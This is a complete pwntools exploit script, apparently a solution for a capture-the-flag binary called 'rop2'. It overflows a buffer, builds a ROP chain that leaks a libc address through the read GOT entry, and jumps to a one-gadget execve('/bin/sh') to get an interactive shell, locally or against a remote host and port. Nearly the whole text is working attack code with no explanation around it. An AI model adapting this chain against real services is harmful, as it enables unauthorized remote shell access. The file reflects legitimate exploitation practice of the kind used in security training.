#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
#gdb_bool = False

def exploit(r):
    r.recvline()
    buf = ""
    buf += "A" * cyclic_find("caaaaaaa",n=8)

    #print out addr of writes got entry by calling write
    buf += p64(0x4005ab) #pop rsi
    buf += p64(0x601020) #read got

    buf += p64(0x04005a9) #pop rdi
    buf += p64(1)

    buf += p64(0x4005ad) #pop rdx
    buf += p64(6)

    buf += p64(0x400588) #write

    r.sendline(buf)


    addr = u64(r.recvn(6).ljust(8,"\x00"))
    log.info("Leaked addr %s"% hex(addr))
    readoff = 0xF7250
    base_libc = addr - readoff
    log.info("base_libc %s" %hex(base_libc))


    '''
        0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL

    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL

    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL

    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
'''
    onegadget = 0x45216 + base_libc
    log.info("onegadget %s"%hex(onegadget))
    buf2 = "a" * cyclic_find("caaaaaaa",n=8)
    buf2 += p64(0x4005a7)
    buf2 += p64(0)
    buf2 += p64(onegadget)
    r.sendline(buf2)

    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])

    binary_name = "rop2"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name,env={"LD_PRELOAD" : "./rop2_libc.so"})
        print util.proc.pidof(r)
        gdb_cmd = [
           "b read",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)


